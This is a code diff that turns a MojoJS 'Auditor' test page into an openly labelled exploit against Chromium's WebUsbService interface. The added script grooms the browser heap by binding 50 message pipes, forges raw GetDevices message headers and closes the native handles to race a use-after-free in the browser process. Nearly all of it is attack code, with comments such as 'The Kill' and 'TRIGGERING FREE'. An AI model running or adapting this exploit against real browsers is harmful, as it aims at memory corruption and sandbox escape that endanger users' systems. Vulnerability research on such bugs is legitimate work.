@@ -5,9 +5,9 @@
     <script src="gen/mojo/public/js/bindings.js"></script>
 </head>
 <body>
-    <h1>MojoJS 2Auditor</h1>
+    <h1>MojoJS Ghost Payload (Raw Binary)</h1>
     <script type="module">
-        import { WebUsbServiceRemote, WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
+        import { WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
 
         async function triggerExploit() {
             if (typeof Mojo === 'undefined') {
@@ -15,51 +15,47 @@
                 return;
             }
 
-            console.log("[*] Analyzing Mojo Handle Structure...");
-            let services = [];
+            console.log("[*] Grooming the Browser Heap with raw pipes...");
+            let pipes = [];
             
             for(let i = 0; i < 50; i++) {
-                // 1. Manually create the pipe to ensure we have raw handles
+                // 1. Create the raw native message pipe
                 let pipe = Mojo.createMessagePipe();
-                let handleForBrowser = pipe.handle0;
-                let handleForJS = pipe.handle1;
-
-                // 2. Bind the Browser end
-                Mojo.bindInterface(WebUsbService.$interfaceName, handleForBrowser);
-
-                // 3. Bind the JS end to our Remote
-                let remote = new WebUsbServiceRemote();
                 
-                // We use the most reliable way to attach a handle to a remote in ES6
-                if (remote.$ && typeof remote.$.bindHandle === 'function') {
-                    remote.$.bindHandle(handleForJS);
-                } else if (typeof remote.bindHandle === 'function') {
-                    remote.bindHandle(handleForJS);
-                } else {
-                    // Final fallback: use the internal connection object
-                    remote.$.connection.bindHandle(handleForJS);
-                }
-
-                services.push(remote);
+                // 2. Bind the Browser Process end
+                Mojo.bindInterface(WebUsbService.$interfaceName, pipe.handle0);
+                
+                // Keep track of the JS end
+                pipes.push(pipe.handle1);
             }
 
-            console.log("[+] Bound 50 pipes. Testing async calls...");
+            console.log("[+] Bound 50 pipes. Forging raw binary GetDevices message...");
             
-            for(let s of services) {
-                try {
-                    s.getDevices(); 
-                } catch(e) {
-                    console.log("[-] Call failed, trying internal pointer...");
-                    // Some versions require calling through the internal router
-                    s.$.getDevices();
-                }
+            // 3. Construct the exact 24-byte Mojo Message Header for GetDevices (Ordinal 1)
+            // Header struct: [Size (uint32), Version (uint32), Interface ID (uint32), Message Name/Ordinal (uint32), Flags (uint32), Trace ID (uint32)]
+            let buffer = new ArrayBuffer(24);
+            let view = new DataView(buffer);
+            view.setUint32(0, 24, true); // Size: 24 bytes
+            view.setUint32(4, 1, true);  // Version: 1
+            view.setUint32(8, 0, true);  // Interface ID: 0 (default)
+            view.setUint32(12, 1, true); // Message Ordinal: 1 (GetDevices)
+            view.setUint32(16, 1, true); // Flags: 1 (Expects response)
+            view.setUint32(20, 0, true); // Trace ID: 0
+            
+            for(let p of pipes) {
+                // 4. Send the raw binary message directly to C++
+                // We bypass all JS wrapper classes.
+                p.writeMessage(buffer, []);
             }
 
+            // THE RACE CONDITION
             await new Promise(r => setTimeout(r, 1)); 
 
             console.log("[!] TRIGGERING FREE...");
-            for(let s of services) {
-                s.$.close();
+            
+            // 5. The Kill: Close the native handles
+            for(let p of pipes) {
+                p.close();
             }
 
             if (window.gc) { window.gc(); }
